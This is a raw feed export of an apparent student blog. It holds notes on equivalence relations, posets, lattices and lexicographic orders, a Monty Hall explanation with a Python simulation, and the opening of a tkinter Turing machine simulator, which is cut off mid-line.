Sort</a></li><li><a href="#well-ordered-sets">Well-Ordered Sets</a><ul><li><a href="#examples-3">Examples</a></li></ul></li><li><a href="#cartesian-products">Cartesian products</a></li><li><a href="#lexicographic-order">Lexicographic order</a></li><li><a href="#lenlex-order">Lenlex order</a></li><li><a href="#example-for-above">example for above</a></li></ul></li></ul><h1 id="Equivalence-Relations-R-S-T"><a href="#Equivalence-Relations-R-S-T" class="headerlink" title="Equivalence Relations (R)(S)(T)"></a>Equivalence Relations (R)(S)(T)</h1><p>Equivalence relations capture a general notion of “equality”. They are relations which are:</p><p><strong>Reflexive (R)</strong>: Every object should be “equal” to itself</p><p><strong>Symmetric (S)</strong>: If x is “equal” to y, then y should be “equal” to x</p><p><strong>Transitive (T)</strong>: If x is “equal” to y and y is “equal” to z, then x should be “equal” to z.</p><h2 id="definition-of-Equivalence-Relation"><a href="#definition-of-Equivalence-Relation" class="headerlink" title="definition of Equivalence Relation"></a>definition of Equivalence Relation</h2><p><strong>A binary relation R ⊆ S ×S</strong> is <strong>equivalence relation</strong> if it satisfies (R), (S), (T).</p><h1 id="Equivalence-Classes"><a href="#Equivalence-Classes" class="headerlink" title="Equivalence Classes"></a>Equivalence Classes</h1><p>Suppose R ⊆ S ×S is an equivalence relation</p><p>The <strong>equivalence class</strong> [s] (w.r.t. R) of an element s ∈ S is</p><script type="math/tex; mode=display">[s] = \{ t: t \in S \quad and \quad sRt \}</script><p><strong>Fact</strong></p><p>s R t if and only if [s] = [t].</p><h1 id="Partitions"><a href="#Partitions" class="headerlink" title="Partitions"></a>Partitions</h1><p>A partition of a set S is a collection of sets $S_1, \dots, S_k$ such that</p><script type="math/tex; mode=display">S_i \quad and \quad S_j \text{ are disjoint for i } \neq \text{ j}\\S = S_1 \cup S_2 \cup \dots \cup S_k = \cup^{k}_{i=1} S_i</script><p>The collection of all equivalence classes {[s] : s ∈ S} forms a partition of S.</p><p>In the opposite direction, a partition of a set defines the equivalence relation on that set. If $S = S_1 \cup S_2 \cup \dots \cup S_k$, then we can define $\sim \subseteq S \times S$ as </p><script type="math/tex; mode=display">s \sim t \text{ exactly when s and t belong to the same } S_i.</script><h2 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h2><p>Q: Show that $m ∼ n$ iff $m^2 \underset{(5)}{=} n^2$ is an equivalence on </p><script type="math/tex; mode=display">S = \{1, \dots, 7\}</script><p>A:<br>It just means that $m \underset{(5)}{=} n$ or $m \underset{(5)}{=} -n$ </p><p>e.g. $1 \underset{(5)}{=} -4$ </p><p>This satisfies (R), (S), (T).</p><p>Find all the equivalence classes.</p><p>We have<br>[1] = {1,4,6},<br>[2] = {2,3,7},<br>[5] = {5}</p><h1 id="Partial-Orders-R-AS-T"><a href="#Partial-Orders-R-AS-T" class="headerlink" title="Partial Orders (R),(AS),(T)"></a>Partial Orders (R),(AS),(T)</h1><p>A <strong>partial order</strong> $\preceq$ on S satisfies (R),(AS),(T)</p><p>We call $(S, \preceq)$ a poset — partially ordered set</p><h2 id="examples-1"><a href="#examples-1" class="headerlink" title="examples"></a>examples</h2><p>Posets:</p><script type="math/tex; mode=display">(\mathbb{Z}, \preceq)\\(Pow(X), \subseteq) \text{ for some set X}\\(\mathbb{N},|)</script><p>Not posets:</p><script type="math/tex; mode=display">(\mathbb{Z}, <)\\(\mathbb{Z}, |)</script><h1 id="Hasse-diagram"><a href="#Hasse-diagram" class="headerlink" title="Hasse diagram"></a>Hasse diagram</h1><p>Every finite poset (S,⪯) can be represented with a <strong>Hasse diagram</strong>:</p><p>Nodes are elements of S</p><p>An edge is drawn upward from x to y if x ≺ y and there is no z such that x ≺ z ≺ y</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-18-49-47.png" alt></p><h1 id="Ordering"><a href="#Ordering" class="headerlink" title="Ordering"></a>Ordering</h1><h2 id="Minimal-Maximal-Minimum-Maximum"><a href="#Minimal-Maximal-Minimum-Maximum" class="headerlink" title="Minimal, Maximal, Minimum, Maximum"></a>Minimal, Maximal, Minimum, Maximum</h2><p>Let (S,⪯) be a poset.</p><p><strong>Minimal</strong> element: x such that there is no y= x with y ⪯ x</p><p><strong>Maximal</strong> element: x such that there is no y= x with x ⪯ y</p><p><strong>Minimum (least)</strong> element: x such that x ⪯ y for all y ∈ S</p><p><strong>Maximum (greatest)</strong> element: x such that y ⪯ x for all y ∈S</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-07-49.png" alt></p><p>Take Notice</p><p>There may be multiple minimal/maximal elements.</p><p>Minimum/maximum elements are the unique minimal/maximal elements if they exist.</p><p>Minimal/maximal elements always exist in finite posets, but not necessarily in infinite posets.</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Pow({a,b,c}) with the order ⊆, <code>∅</code> is minimum; <code>&#123;a,b,c&#125;</code> is maximum</p><p><code>Pow(&#123;a,b,c&#125;) \ &#123;&#123;a,b,c&#125;&#125;</code> (proper subsets of {a,b,c}). Each two-element subset <code>&#123;a,b&#125;,&#123;a,c&#125;,&#123;b,c&#125;</code> is <code>maximal</code>. But there is no maximum</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-08-19.png" alt></p><h2 id="upper-bound-lower-bound-lub-glb"><a href="#upper-bound-lower-bound-lub-glb" class="headerlink" title="upper bound,  lower bound, lub, glb"></a>upper bound,  lower bound, lub, glb</h2><p>Let (S,⪯) be a poset.</p><p>x is an <strong>upper bound</strong> for A if a ⪯ x for all a ∈ A</p><p>x is a <strong>lower bound</strong> for A if x ⪯ a for all a ∈ A</p><p>The <strong>set of upper bounds</strong> for A is defined as ub(A) = {x : a ⪯ x for all a ∈ A}</p><p>The <strong>set of lower bounds</strong> for A is defined as lb(A) = {x : x ⪯ a for all a ∈ A}</p><p>The <strong>least upper bound</strong> of A, <strong>lub(A)</strong>, is the minimum of ub(A) (if it exists)</p><p>The <strong>greatest lower bound</strong> of A, <strong>glb(A)</strong> is the maximum of lb(A) (if it exists)</p><h2 id="lub-glb"><a href="#lub-glb" class="headerlink" title="lub, glb"></a>lub, glb</h2><p>To show x is glb(A) you need to show:</p><ul><li><p>x is a lower bound: x ⪯ a for all a ∈ A.</p></li><li><p>x is the greatest of all lower bounds: If y ⪯ a for all a ∈ A then y ⪯ x</p></li></ul><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>Pow(X) ordered by ⊆.</p><ul><li><p>glb(A,B) = A∩B</p></li><li><p>lub(A,B) = A∪B</p></li></ul><h2 id="lattice-and-complete-lattice"><a href="#lattice-and-complete-lattice" class="headerlink" title="lattice and complete lattice"></a>lattice and complete lattice</h2><p>Let (S,⪯) be a poset.</p><ul><li>(S,⪯) is a <strong>lattice</strong> if lub(x,y) and glb(x,y) exist for every pair of elements x,y ∈ S.</li><li>(S,⪯) is a <strong>complete lattice</strong> if lub(A) and glb(A) exist for every subset A ⊆ S.</li></ul><p>Take Notice</p><p>A finite lattice is always a complete lattice.</p><p>An infinite lattice need not have a lub (or no glb) for an arbitrary infinite subset of its elements, in particular no such bound may exist for <strong>all</strong> its elements.</p><p>For the pic below, for (b,c), {e,d,f} are the upper bounds, but there is no minimum of the ub. Hence lub doesnot exist, it is not a lattice.</p><p>it is not a lattice. for (e,d), b,c,a are the minimals, but they are not the minimum.</p><p><img src="/2024/10/06/Math/relation-2/lattice1.png" alt></p><p>is 30 the lub(5,15)? yes! is it a lattice? Yes, because it is finite.</p><p>who is the lb({10,30})? it is 10! And 10 is also glb({10,30})! Remember the poset can include themselves.</p><p><img src="/2024/10/06/Math/relation-2/lattice3.png" alt></p><p>not a lattice obviously.</p><p><img src="/2024/10/06/Math/relation-2/lattice4.png" alt></p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>Q</p><p>{1,2,3,4,6,8,12,24} partially ordered by divisibility is a lattice</p><ul><li>e.g. lub({4,6}) = 12; glb({4,6}) = 2</li></ul><p>{1,2,3} partially ordered by divisibility is not a lattice</p><ul><li>{2,3} has no lub</li></ul><p>{2,3,6} partially ordered by divisibility</p><ul><li>{2,3} has no glb</li></ul><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-27-21.png" alt></p><p>{1,2,3,12,18,36} partially ordered by divisibility</p><ul><li>{2,3} has no lub (12,18 are minimal upper bounds)</li></ul><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-27-45.png" alt></p><hr><p>Q</p><p>(Z,≤): neither lub(Z) nor glb(Z) exist</p><p>(F(N),⊆) [all finite subsets of N]: lub exists for pairs of elements but not generally for (infinite) sets of elements. glb exists for any set of elements: intersection of a set of finite sets is finite.</p><p>(I(N),⊆) [all infinite subsets of N]: glb does not exist for some pairs of elements (e.g. odds and evens). lub exists for any set of elements: union of a set of infinite sets is always infinite.</p><hr><p>Q: Considerposet(R,≤)</p><p>(a) Is this a lattice?</p><p>(b) Give an example of a non-empty subset of R that has no upper bound.</p><p>(c) Find lub({ x ∈ R:x &lt; 73 })</p><p>(d) Find lub({ x ∈ R:x ≤ 73 })</p><p>(e) Find lub( x :$x^2$ &lt; 73 )</p><p>(f) Find glb( x :$x^2$ &lt; 73 )</p><p>A:</p><p>Yes</p><p>{ r ∈R:r &gt;0}</p><p>=(0,∞)</p><p>73</p><p>73</p><p>√73</p><p>−√73</p><h1 id="Total-orders"><a href="#Total-orders" class="headerlink" title="Total orders"></a>Total orders</h1><p>A <strong>total order</strong> is a <strong>partial order</strong> that also satisfies:</p><p><strong>(L) Linearity</strong> (any two elements are comparable):</p><p>For all x,y either: x ≤ y or y ≤ x (or both if x = y)</p><p>Take Notice</p><p>On a finite set all total orders are “isomorphic”</p><p>On an infinite set there is quite a variety of possibilities.</p><h2 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h2><p>Z with ≤:</p><p>(no minimum/maximum element)</p><p>Z with {(x,y) : (xy ≤ 0 and x ≤ y) or (xy &gt; 0 and |x| ≤ |y|)}:</p><p>(no maximum element, minimum element is-1)</p><p>Z with {(x,y) : (xy ≤ 0 and x ≥ y) or (xy &gt; 0 and x ≤ y)}:</p><p>(minimum element 1, maximum element-1)</p><h1 id="Ordering-of-a-Poset"><a href="#Ordering-of-a-Poset" class="headerlink" title="Ordering of a Poset"></a>Ordering of a Poset</h1><h2 id="Topological-Sort"><a href="#Topological-Sort" class="headerlink" title="Topological Sort"></a>Topological Sort</h2><p>For a poset (S,⪯) any total order ≤ that is consistent with ⪯ (if a ⪯b then a ≤b) is called a <strong>topological sort</strong>.</p><p>Consider</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-39-20.png" alt></p><p>The following all are topological sorts:</p><pre><code>a ≤ b ≤ e ≤ c ≤ f ≤da ≤ e ≤ b ≤ f ≤ c ≤da ≤ e ≤ f ≤ b ≤ c ≤d</code></pre><p>all of these orders are right</p><h2 id="Well-Ordered-Sets"><a href="#Well-Ordered-Sets" class="headerlink" title="Well-Ordered Sets"></a>Well-Ordered Sets</h2><p>A <strong>well-ordered set</strong> is a poset where every subset has a least element</p><p>Take Notice</p><p>The greatest element is not required.</p><p>Well-ordered sets are an important mathematical tool to prove termination of programs.</p><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><script type="math/tex; mode=display">\mathbb{N} = \{ 0, 1, \dots \}</script><p> Disjoint union of copies of $\mathbb{N}$:</p><script type="math/tex; mode=display">\mathbb{N}_1 \cup \mathbb{N}_2 \cup \mathbb{N}_3 \cup \dots</script><p>where each Ni ≃ N and N1 &lt; N2 &lt; N3···</p><h2 id="Cartesian-products"><a href="#Cartesian-products" class="headerlink" title="Cartesian products"></a>Cartesian products</h2><p>Product order: Given posets $(S,⪯_S)$ and $(T,⪯_T)$, define:</p><p>(s, t) ⪯ (s’,t’) if s $⪯_S$ s′ and t $⪯_T$ t’</p><p>Notes</p><p>No implicit weighting.</p><p>No bias toward any component.</p><p>In general, it is only a partial order, even if combining total orders.</p><p>Which cannot compare contray s and t:</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-50-52.png" alt></p><h2 id="Lexicographic-order"><a href="#Lexicographic-order" class="headerlink" title="Lexicographic order"></a>Lexicographic order</h2><p>Given posets (S,$⪯<em>S$) and (T,$⪯_T$), define:<br>(s, t) $≤</em>{lex}$ (s′,t′) if s $⪯_S$ s′ or (s = s′ and t $⪯_T$ t′)</p><p>Extension to words: $λ ≤_{lex} w$ for all words</p><p>Notes</p><p>No implicit weighting.</p><p>Gives total order when combining total orders.</p><p>Can be sensibly extended to words.</p><p><strong>Not ideal for enumeration.</strong></p><h2 id="Lenlex-order"><a href="#Lenlex-order" class="headerlink" title="Lenlex order"></a>Lenlex order</h2><p>Lexicographic ordering, but order by length first.</p><p><img src="/2024/10/06/Math/relation-2/2024-10-06-19-56-31.png" alt></p><p>Notes</p><p>Only applicable for languages (subsets of $Σ^∗$).</p><p>Gives total order when Σ is totally ordered.</p><p>Gives an enumeration of $Σ^∗$.</p><h2 id="example-for-above"><a href="#example-for-above" class="headerlink" title="example for above"></a>example for above</h2><p>Q</p><p>Let $\mathbb{B}$={0,1} with the usual order 0&lt;1. List the elements 101,010,11,000,10,0010,1000 of $\mathbb{B}^*$ in the</p><p>(a) Lexicographic order</p><p>000,0010,010,10,1000,101,11</p><p>(b) Lenlex order</p><p>10,11,000,010,101,0010,1000</p><hr><p>Q:</p><p>Whenarethelexicographic order and lenlex on $Σ^∗$ the same?</p><p>Only when $|Σ| = 1$.</p><hr><p>Q: Trueor false?</p><p>(a) If a set Σ is totally ordered, then the corresponding lexico graphic partial order on $Σ^∗$ also must be totally ordered.</p><p>True</p><p>(b) If a set Σ is totally ordered, then the corresponding lenlex order on $Σ^∗$ also must be totally ordered.</p><p>True</p><p>(c) Every finite poset has a Hasse diagram.</p><p>True</p><p>(d) Every finite poset has a topological sorting.</p><p>True</p><p>(e) Every finite poset has a minimum element.</p><p>False</p><p>(f) Every finite totally ordered set has a maximum element.</p><p>True</p><p>(g) An infinite poset cannot have a maximum element.</p><p>False</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MontyHall(UNSW)</title>
      <link href="/2024/10/04/Algorithm/MontyHall/"/>
      <url>/2024/10/04/Algorithm/MontyHall/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#introduction">introduction</a></li><li><a href="#problem">problem</a></li><li><a href="#analysis">analysis</a></li><li><a href="#simulation">simulation</a></li></ul><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>I first meet Monty Hall problem in a korean drama that is called D.P.: A soldier escaped from the military, and applied the essence of Monty Hall problem to make life better, although I think it was not rigorous.</p><p>Monty Hall problem is not complicated, it is an only high school level’s statistic problem. But it is a little counter-intuitive.</p><p><a href="https://en.wikipedia.org/wiki/Monty_Hall_problem">Monty Hall on wikipedia</a></p><p>The description of Monty Hall problem is cited from UNSW COMP9021, there is a nuance between the wikipedia’s description and the context below about <strong>2 goats</strong> OR <strong>1 goat and one empty room</strong>. I would prefer to use <code>2 goats</code> later, and please regard the two conditions as an equivalence. Just regard choosing the car as a success.</p><h1 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h1><p>A contestant and a host are at a place that gives access to three rooms, whose doors are all closed before the game starts. A car is in one room, a goat in another, while the third room is empty. The host knows what is in each room, while the contestant doesn’t. The contestant is asked to chose one of the doors. Following that choice, the host opens another door, which is that of a room that does not contain the car. The contestant is then asked to either stick to his choice or “switch”, that is, choose the third door (e.g., the door which is neither the one he chose in the first place nor the one that the host opened). The host opens the door as requested by the contestant, who wins what is in the room, if anything. The question is: what is the contestant’s best strategy – to switch or not to switch?</p><h1 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h1><p>The contestant wishes to win the car, not the goat. He has one chance out of three to, in the first place, choose the door of the room that contains the car.</p><ul><li>If he does not switch, he then has one chance out of three to win.</li><li>If he switches then he loses in case the room he chose in the first place contains the car. But he wins otherwise. Indeed, out of both doors that are still closed, one contains the car, so the host has to open the other one (that is, if the room whose door was chosen in the first place contains nothing, then the host opens the door of the room that contains the goat, and if the room whose door was chosen in the first place contains the goat, then the host opens the door of the room that contains nothing). So in both cases, the second door that the host opens following the decision of the contestant to switch is that of the room that contains the car.</li></ul><p>Hence by switching, the contestant has two chances out of three to win. Hence it is best to switch.</p><p>The car is put average Randomly behind the rooms, so we can use chart to list all the situations.</p><div class="table-container"><table><thead><tr><th>Behind door 1</th><th>Behind door 2</th><th>Behind door 3</th><th>Result if staying at door</th><th>Result if switching to the door offered</th></tr></thead><tbody><tr><td>Goat</td><td>Goat</td><td><strong>Car</strong></td><td>Wins goat</td><td><strong>Wins car</strong></td></tr><tr><td>Goat</td><td><strong>Car</strong></td><td>Goat</td><td>Wins goat</td><td><strong>Wins car</strong></td></tr><tr><td><strong>Car</strong></td><td>Goat</td><td>Goat</td><td><strong>Wins car</strong></td><td>Wins goat</td></tr></tbody></table></div><p>For the contestant, at the beginning before the host opened a room without car, he has 1/3 chance to win the car; but later the host intendly chooses the room without car, notebly it is not random. And contestant now has 1/2 chance to win the car of these two room left.</p><p>But it is an entire game, we need to calculate the opportunity from the very first beginning. Our intuition of 1/3 and 1/2 is not wrong, but it is counter-intuitive to compute the cumulative chance. The contestant doesnot do temporary decision, which is only 1/3 and 1/2 at those stages. He wants to do the best strategy of the whole game. The interference factor is the host’s choosing intendly.</p><p>I’d better to recommand the probability calculation below or simulation to figure it out.</p><h1 id="simulation"><a href="#simulation" class="headerlink" title="simulation"></a>simulation</h1><p>We aim to simulate the playing of this game, with either strategy, switching or not, to check that when it is played with the chosen strategy a large enough number of times, then the experimental results support the conclusions of the previous reasoning. More precisely, the user should be asked and express whether he wants to switch and how many times the game should be played. By default, if the user requests to play at most 6 games, then the details of each game (which door the contestant choses in the first place, which door the host opens first, and which door he opens next that determines the outcome of the game), will be output; if the user requests more games to be played, then the details of the first 6 games only will be output. It should be possible to set the default of 6 to another value. In any case, the percentage of times the contestant won the game should be eventually displayed.</p><p><strong>Notebly: Don’t use seed</strong> in a totally random scene. Random function only is enough to simulate a totally random number, and seed is only to avoid the predicted of the random function, because it depends on system’s date or something. But the dependency is a really random number.</p><pre><code class="lang-python"># Written by Eric Martin for COMP9021&#39;&#39;&#39;Simulates the Monty Hall problem.- A car is hidden behind 3 doors.- The contestant randomly choses a door.- The game host opens a door behind which there is no car.- The contestant then has the option to change her mind and open another  door.Prompts the user for the number of times the game is played, and whetherthe contestant opts for switching door or not.Displays the details of the game for the few first games, set to amaximum of 6 by default, and prints out the proportion of games beingwon.&#39;&#39;&#39;from random import choice, randrangedef set_simulation():    while True:        try:            nb_of_games = int(input(&#39;How many games should I simulate? &#39;))            if nb_of_games &lt;= 0:                raise ValueError            break        except ValueError:            print(&#39;Your input is incorrect, try again.&#39;)    while True:        contestant_switches = input(&#39;Should the contestant switch? &#39;)        if contestant_switches.istitle():            contestant_switches = contestant_switches.lower()        if contestant_switches in &#123;&#39;yes&#39;, &#39;y&#39;&#125;:            contestant_switches = True            print(&#39;I keep in mind you want to switch.&#39;)            break        if contestant_switches in &#123;&#39;no&#39;, &#39;n&#39;&#125;:            contestant_switches = False            print(&quot;I keep in mind you don&#39;t want to switch.&quot;)            break        print(&#39;Your input is incorrect, try again.&#39;)    return nb_of_games, contestant_switchesdef simulate(nb_of_games_to_display=6):    nb_of_games, contestant_switches = set_simulation()    print(&#39;Starting the simulation with the contestant&#39;, end=&#39; &#39;)    if not contestant_switches:        print(&#39;not &#39;, end=&#39;&#39;)    print(&#39;switching doors.\n&#39;)    nb_of_wins = 0    for i in range(nb_of_games):        doors = [&#39;A&#39;, &#39;B&#39;, &#39;C&#39;]        winning_door = choice(doors)        if i &lt; nb_of_games_to_display:            print(&#39;\tContestant does not know it, but car &#39;                  f&#39;happens to be behind door &#123;winning_door&#125;.&#39;                 )        first_chosen_door = doors.pop(randrange(3))        if i &lt; nb_of_games_to_display:            print(f&#39;\tContestant chooses door &#123;first_chosen_door&#125;.&#39;)        second_chosen_door = first_chosen_door        if first_chosen_door == winning_door:            opened_door = doors.pop(randrange(2))            if contestant_switches:                second_chosen_door = doors[0]            else:                nb_of_wins += 1        else:            doors.remove(winning_door)            opened_door = doors[0]            if contestant_switches:                second_chosen_door = winning_door                nb_of_wins += 1        if i &lt; nb_of_games_to_display:            print(f&#39;\tGame host opens door &#123;opened_door&#125;.&#39;)            print(f&#39;\tContestant chooses door &#123;second_chosen_door&#125;&#39;, end=&#39; &#39;)            print(&#39;and wins.\n&#39;) if second_chosen_door == winning_door\                                 else print(&#39;and looses.\n&#39;)        elif i == nb_of_games_to_display:            print(&#39;...\n&#39;)    print(f&#39;Contestant won &#123;nb_of_wins / nb_of_games * 100:.2f&#125;% of games.&#39;)if __name__ == &#39;__main__&#39;:    simulate()</code></pre>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TuringMachine(UNSW)</title>
      <link href="/2024/10/03/Algorithm/TuringMachine/"/>
      <url>/2024/10/03/Algorithm/TuringMachine/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#introduction">introduction</a></li><li><a href="#turing-machine-simulator">turing machine simulator</a></li><li><a href="#instructions">instructions</a></li></ul><h1 id="introduction"><a href="#introduction" class="headerlink" title="introduction"></a>introduction</h1><p>Alan Turing invented the Turing Machine in 1936, and this impact the history of computer. It is a very early but ultimate structure to compute something as a machine, and there is no any other better computation algorithm yet.</p><p>It has much more ancestor and complicated thoughts and instructions than assembly instructions, and most Turing study cases are in binary numbers(two based numbers), so you can imagine the ancient punched tapes are used in the early history of automatic computation. It’s implemention is not hard, but you would find it hard to conceive the basic and origin algorithms to compute addition, subtraction and so on.</p><p>Maybe you would find it difficult to read the wikipedia pages to study Turing Machine, but according my ideas, Turing Machine was built in much eairly time, thoes inventors just donnot compute too large numbers and use various application, so they could use exact tapes and came up with Turing Machine; however, we are neo-human beings, and often dont think too origin methodologies, so we directly study it may be much hard.</p><p>For learning easier, you can have a look of these videos, which may take less than one hour to have a intuitive understanding:</p><ol><li><a href="https://www.bilibili.com/video/BV1br4y1N762/">https://www.bilibili.com/video/BV1br4y1N762/</a></li><li>Neso Academy<br><a href="https://www.youtube.com/watch?v=PvLaPKPzq2I">https://www.youtube.com/watch?v=PvLaPKPzq2I</a><br><a href="https://www.youtube.com/watch?v=GPSk9tRsK2I">https://www.youtube.com/watch?v=GPSk9tRsK2I</a></li></ol><p>And now, congratulation for your memory, you have got many terms. Then just try to read, understand and debug the code below, it is not hard to read, there is only one standard GUI lib, tkinter, imported. The code was written by Eric Martin (my python lecturor in UNSW), and it is very clever and concise!</p><h1 id="turing-machine-simulator"><a href="#turing-machine-simulator" class="headerlink" title="turing machine simulator"></a>turing machine simulator</h1><p>turing_machine_simulator.py</p><pre><code class="lang-python"># Written by Eric Martin for COMP9021import tkinter as tkimport tkinter.scrolledtextimport tkinter.messageboximport tkinter.simpledialogclass TuringMachineSimulator(tk.Tk):    max_nb_of_steps = 1000    def __init__(self):        super().__init__()        self.title(&#39;Turing Machine Simulator&#39;)        menubar = tk.Menu()        help_menu = tk.Menu(menubar)        menubar.add_cascade(label=&#39;Turing Machine Simulator Help&#39;,                            menu=help_menu                          )        help_menu.add_command(label=&#39;Tape&#39;, command=self.tape_help)        help_menu.add_command(label=&#39;Program&#39;, command=self.program_help)        help_menu.add_command(label=&#39;Execution&#39;, command=self.execution_help)        self.config(menu=menubar)        self.scrollable_tape = ScrollableTape()        self.scrollable_tape.pack()        self.program = Program()        dashboard = tk.Frame()        self.state = State(dashboard)        self.state.pack(padx=20, side=tk.LEFT)        self.iteration = Iteration(dashboard)        self.iteration.pack(padx=20, side=tk.LEFT)        self.status = Status(dashboard, self.program)        self.status.pack(padx=20)        dashboard.pack()        buttons = tk.Frame(bd=20)        self.next_phase = &#39;Start&#39;        self.next_phase_button = tk.Button(buttons, text=&#39;Start&#39;, width=5,                                          command=self.change_interface                                          )        self.next_phase_button.pack(padx=30, side=tk.LEFT)        self.step_button = tk.Button(buttons, text=&#39;Step&#39;, command=self.step,                                    state=tk.DISABLED                                    )        self.step_button.pack(padx=30, side=tk.LEFT)        self.continue_button = tk.Button(buttons, text=&#39;Continue&#39;,                                        command=self.run_further,                                        state=tk.DISABLED                                        )        self.continue_button.pack(padx=30)        buttons.pack()        self.program.pack()    def tape_help(self):        tkinter.messagebox.showinfo(                &#39;Tape&#39;,                &#39;The tape always contains an &quot;origin&quot; cell.\n\nControl &#39;                &#39;clicking to the right or to the left of the current &#39;                &#39;rightmost or leftmost cell, respectively, adds a new &#39;                &#39;cell.\n\n Control clicking on the current rightmost &#39;                &#39;or leftmost added cell removes it.\n\nClicking on any &#39;                &#39;cell flips the bit it contains from 1 to 0 or from 0 &#39;                &#39;to 1.&#39;                                    )    def program_help(self):        tkinter.messagebox.showinfo(                &#39;Program&#39;,                &#39;A program is a set of instructions of the form\n&#39;                &#39;    (state_1, bit_1, state_2, bit_2, dir)\n&#39;                &#39;where state_1 and state_2 have to be alphanumeric &#39;                &#39;words with at most 8 characters, bit_1 and bit_2 have &#39;                &#39;to be 0 or 1, and dir has to be L or R.\n\nWhen the &#39;                &#39;TM machine is in state state_1 with its head pointing &#39;                &#39;to a cell containing bit_1, then it changes bit_1 to &#39;                &#39;bit_2 in that cell, modifies its state to state_2, &#39;                &#39;and moves its head one cell to the right or to the &#39;                &#39;left as determined by dir.\n\nThe TM machine is &#39;                &#39;supposed to be deterministic, hence the program &#39;                &#39;should not contain two instructions starting with &#39;                &#39;the same pair (state_1, bit_1).\n\nThe program can &#39;                &#39;contain comments, namely, lines starting with #.&#39;                                    )    def execution_help(self):        tkinter.messagebox.showinfo(                &#39;Execution&#39;,                &#39;When the leftmost button displays Start, the status &#39;                &#39;indicator is red, the tape can be modified, the &#39;                &#39;program can be edited, the Step and Continue buttons &#39;                &#39;are disabled, and no State or Iteration is &#39;                &#39;displayed.\n\n Once this button has been pressed, it &#39;                &#39;displays Stop, the status indicator is green, the &#39;                &#39;tape cannot be modified, the program cannot be &#39;                &#39;edited, and the current State and Iteration are &#39;                &#39;displayed.\n\nWhen execution stops, either because no &#39;                &#39;instruction can be executed or because Stop has been &#39;                &#39;pressed, the Step and Continue buttons are disabled &#39;                &#39;and the leftmost button displays Clear; it has to be &#39;                &#39;pressed to restore the tape to its initial &#39;                &#39;configuration, with only the &quot;origin&quot; cell &#39;                &#39;containing 1.\n\nPressing the Start button prompts &#39;                &#39;the user for an initial state, which has to be an &#39;                &#39;alphanumeric word with at most 8 characters, and &#39;                &#39;commences execution provided at least one cell &#39;                &#39;contains 1, in which case the head initially points &#39;                &#39;to the leftmost cell containing 1.\n\nThe Step button &#39;                &#39;executes one instruction, if possible; otherwise &#39;                &#39;execution stops.\n\nThe Continue buttom executes up &#39;                &#39;to 1,000 instructions, if possible; otherwise &#39;                &#39;execution stops.\n\nThe Stop button allows one to &#39;                &#39;start a new excution in case it is either not &#39;                &#39;desirable or not possible to terminate execution with &#39;                &#39;a sequence of clicks on the Step or Continue buttons.&#39;                                    )    def change_interface(self):        &#123;&#39;Start&#39;: self.start, &#39;Stop&#39;: self.stop, &#39;Clear&#39;: self.clear        &#125;[self.next_phase]()    def start(self):        if not self.program.read_instructions():            return        initial_state = tkinter.simpledialog.askstring(&#39;Starting program&#39;,                                                      &#39;Enter initial state: &#39;                                                      )        if initial_state is None:            return        if not StateName(initial_state).check_syntactic_validity():            return        # Look for leftmost 1        for i in range(len(self.scrollable_tape.cells[0]) - 1, -1, -1):            if self.scrollable_tape.bits[0][i] == 1:                self.scrollable_tape.tape.itemconfig(                        self.scrollable_tape.cells[0][i], fill=&#39;red&#39;,                        font=(&#39;normal&#39;, 20, &#39;bold&#39;)                                                    )                self.current_index = -i                break        else:            for i in range(1, len(self.scrollable_tape.cells[1])):                if self.scrollable_tape.bits[1][i] == 1:                    self.scrollable_tape.tape.itemconfig(                            self.scrollable_tape.cells[1][i],                            fill=&#39;red&#39;, font=(&#39;normal&#39;, 20, &#39;bold&#39;)                                                        )                    self.current_index = i                    break            else:                tkinter.messagebox.showerror(                        &#39;Tape error&#39;,                        &#39;Cannot run, no bit is set to 1 in tape&#39;                                            )                return        self.status.running_program(True)        self.update_phase(&#39;Stop&#39;)        self.current_bit = 1        self.current_state = initial_state        self.current_iteration = 0        self.iteration.update(0)        self.state.update(initial_state)    def clear(self):        self.scrollable_tape.clear()        self.update_phase(&#39;Start&#39;)    def step(self):        state, bit = self.current_state, self.current_bit        if (state, bit) not in self.program.instructions:            self.status.running_program(False)            self.update_phase(&#39;Clear&#39;)            return        new_state, new_bit, direction = self.program.instructions[state, bit]        self.state.update(new_state)        self.current_iteration += 1        self.iteration.update(self.current_iteration)        i = self.current_index        side = i &gt; 0        j = abs(i)        self.scrollable_tape.bits[side][j] = new_bit        if i == 0:            self.scrollable_tape.bits[not side][0] = new_bit        self.scrollable_tape.tape.itemconfig(                self.scrollable_tape.cells[side][j], text=new_bit,                fill=&#39;black&#39;, font=(&#39;normal&#39;, 16, &#39;normal&#39;)                                            )        i += direction        side = i &gt; 0        j = abs(i)        if j &gt;= len(self.scrollable_tape.bits[side]):            self.scrollable_tape.add_cell_to_end(side)        self.scrollable_tape.tape.itemconfig(                self.scrollable_tape.cells[side][j],                fill=&#39;red&#39;, font=(&#39;normal&#39;, 20, &#39;bold&#39;)                                            )        self.current_bit = self.scrollable_tape.bits[side][j]        self.current_index = i        self.current_state = new_state    def run_further(self):        if self.next_phase == &#39;Stop&#39;:            bound = self.current_iteration + self.max_nb_of_steps        while self.next_phase == &#39;Stop&#39; and self.current_iteration &lt; 